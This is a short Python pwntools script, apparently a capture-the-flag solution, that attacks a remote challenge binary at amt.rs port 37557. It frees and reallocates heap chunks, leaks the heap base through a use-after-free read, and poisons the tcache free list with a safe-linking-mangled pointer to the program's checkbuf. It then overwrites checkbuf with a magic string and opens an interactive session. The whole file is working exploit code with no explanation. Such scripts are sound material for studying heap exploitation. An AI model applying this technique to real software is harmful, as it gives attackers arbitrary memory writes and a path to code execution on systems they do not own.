#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chal')
libc = ELF(exe.libc.path)

io = remote("amt.rs", 37557)

for i in range(2): 
	io.sendlineafter(b"> ", b"0")
	io.sendlineafter(b"> ", str(i).encode())

for i in range(2): 
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"> ", str(i).encode())

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"> ", b"0")

io.recvuntil(b"data> ")
heap_base = u64(io.recv(8)) << 12

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"data> ", p64(exe.sym.checkbuf ^ (heap_base >> 12)))

for i in range(2): 
	io.sendlineafter(b"> ", b"0")
	io.sendlineafter(b"> ", str(i).encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"data> ", b"ALL HAIL OUR LORD AND SAVIOR TEEMO\x00")

io.sendlineafter(b"> ", b"67")
io.interactive()

